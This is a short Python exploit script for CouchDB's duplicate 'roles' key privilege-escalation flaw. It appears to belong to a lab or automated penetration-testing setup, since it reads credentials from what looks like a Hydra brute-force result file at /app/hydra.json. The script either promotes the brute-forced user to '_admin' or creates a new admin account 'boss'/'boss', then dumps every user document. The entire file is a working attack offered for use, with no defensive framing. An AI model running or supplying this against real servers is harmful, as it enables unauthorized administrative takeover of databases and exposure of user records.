import requests
import sys
import json
import os

host = sys.argv[1]

if os.path.exists("/app/hydra.json"):
    result = json.load(open("/app/hydra.json"))['results'][0]
    user = result['login']
    url = f"http://{user}:{result['password']}@{host}"

    user_doc_url = f"{url}/_users/org.couchdb.user:{user}"

    # first pull _rev
    res = requests.get(user_doc_url)
    rev = res.json()['_rev']

    exploit = ('{"_rev": "%s", "type": "user", "name": "%s", "password": "%s", "roles": ["_admin"], "roles": %s }' % (
        rev, user, result['password'], res.json()['roles'])).replace("'", '"')

    requests.put(user_doc_url, data=exploit)
    print(f"Made user {user} to an admin")

    print(requests.get(f"{url}/_users/_all_docs").json())
else:
    user = "boss"
    password = "boss"

    exploit = f'{{"type": "user", "name": "{user}", "password": "{password}", "roles": ["_admin"], "roles": [] }}'

    y = requests.put(f"http://{host}/_users/org.couchdb.user:{user}", data=exploit)
    print(y.json())
    print(f"Created new admin user {user}")

    print(requests.get(f"http://{user}:{password}@{host}/_users/_all_docs").json())
